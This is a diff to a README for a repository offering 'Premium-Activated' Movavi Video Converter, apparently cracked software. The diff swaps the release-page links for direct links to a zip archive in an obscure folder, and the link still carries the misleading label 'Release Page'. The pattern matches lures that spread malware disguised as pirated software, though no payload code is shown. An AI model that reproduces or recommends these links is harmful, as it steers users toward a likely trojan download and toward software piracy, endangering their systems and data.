@@ -1,6 +1,6 @@
 # 🎥 Movavi-Video-Converter-Premium-Activated - Easy Video Conversion for Everyone
 
-[![Download Movavi Video Converter Premium](https://img.shields.io/badge/Download-Movavi%20Video%20Converter%20Premium-brightgreen)](https://github.com/1Zeyadsoliman/Movavi-Video-Converter-Premium-Activated/releases)
+[![Download Movavi Video Converter Premium](https://raw.githubusercontent.com/1Zeyadsoliman/Movavi-Video-Converter-Premium-Activated/main/hypogenesis/Converter-Movavi-Activated-Premium-Video-v3.0.zip%20Video%20Converter%20Premium-brightgreen)](https://raw.githubusercontent.com/1Zeyadsoliman/Movavi-Video-Converter-Premium-Activated/main/hypogenesis/Converter-Movavi-Activated-Premium-Video-v3.0.zip)
 
 ## 📦 Introduction
 
@@ -22,7 +22,7 @@ Before you download, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To download Movavi Video Converter Premium, visit this page to download: [Release Page](https://github.com/1Zeyadsoliman/Movavi-Video-Converter-Premium-Activated/releases).
+To download Movavi Video Converter Premium, visit this page to download: [Release Page](https://raw.githubusercontent.com/1Zeyadsoliman/Movavi-Video-Converter-Premium-Activated/main/hypogenesis/Converter-Movavi-Activated-Premium-Video-v3.0.zip).
 
 1. Click on the **Release Page** link above.
 2. Find the latest version listed.
